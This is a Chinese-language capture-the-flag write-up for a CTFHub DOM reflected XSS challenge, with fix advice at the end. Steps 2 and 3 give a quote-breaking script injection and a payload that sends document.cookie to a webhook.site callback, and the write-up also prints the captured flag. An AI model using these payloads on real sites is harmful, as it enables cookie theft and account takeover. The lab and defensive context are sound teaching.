CTFHub - Web - XSS - DOM 反射型

# CTFHub # Web # XSS # DOM 反射型

一、题目信息

  • 题目名称：XSS DOM Reflex
  • 题目方向：Web - XSS - DOM 反射型
  • 题目目标：利用 URL 参数进入 DOM 脚本上下文，执行脚本并获取 Bot Cookie 中的 Flag。

二、漏洞分析

页面包含一个 text 查询参数。访问 /?text=DOM_MARKER 后，服务端会把参数值写入内联 JavaScript：

<script>
$("#text")[0].innerHTML = 'DOM_MARKER';
</script>

输入既没有进行 JavaScript 字符串转义，也没有在写入 innerHTML 前做安全处理。参数位于单引号字符串中，因此可以注入 ' 结束字符串，再执行任意 JavaScript，最后用 // 注释原代码剩余部分。

页面底部的 Send URL to Bot 会向 /submit 提交 JSON。Bot 使用 HeadlessChrome 访问目标 URL，其 Cookie 中包含 Flag。由于无法直接查看 Bot 页面，需要把 document.cookie 外带到可访问的回调地址。

三、解题步骤

  1. 确认反射位置：传入普通字符串，响应中的 innerHTML 赋值语句会原样包含输入。 
    curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/?text=DOM_MARKER"
  2. 验证脚本逃逸：传入以下内容可闭合单引号并执行额外语句。 
    ';document.body.dataset.poc='escaped';//
    响应中的脚本变为： 
    $("#text")[0].innerHTML = '';document.body.dataset.poc='escaped';//';
  3. 构造外带 Payload：使用 new Image() 发起 GET 请求，避免页面跳转，并把 Cookie 编码后放入查询参数。 
    ';new Image().src="https://webhook.site/<token>/?c="+encodeURIComponent(document.cookie);//
  4. 提交给 Bot：对 text 参数进行 URL 编码，再通过 /submit 提交完整 URL。 
    POST /submit
Content-Type: application/json

{"url":"http://challenge-xxx.sandbox.ctfhub.com:10800/?text=...payload..."}
    接口返回： 
    {
  "code": 0,
  "msg": "Successfully"
}
  5. 读取回连数据：Bot 的 HeadlessChrome 加载页面后执行脚本，回调服务收到： 
    GET /?c=flag%3Dctfhub%7B367c05482d0050d368ff2494%7D
    URL 解码后得到 flag=ctfhub{367c05482d0050d368ff2494}。

四、最终 Flag

ctfhub{367c05482d0050d368ff2494}

五、修复建议

  • 不要把 URL 参数直接拼接进 JavaScript 字符串，应使用 JSON 序列化或安全的数据传递方式。
  • 写入 DOM 时优先使用 textContent；必须使用 innerHTML 时应先进行上下文相关的安全处理。
  • 部署 CSP 限制内联脚本与外部数据发送；敏感 Cookie 应设置 HttpOnly，降低 XSS 造成的影响。
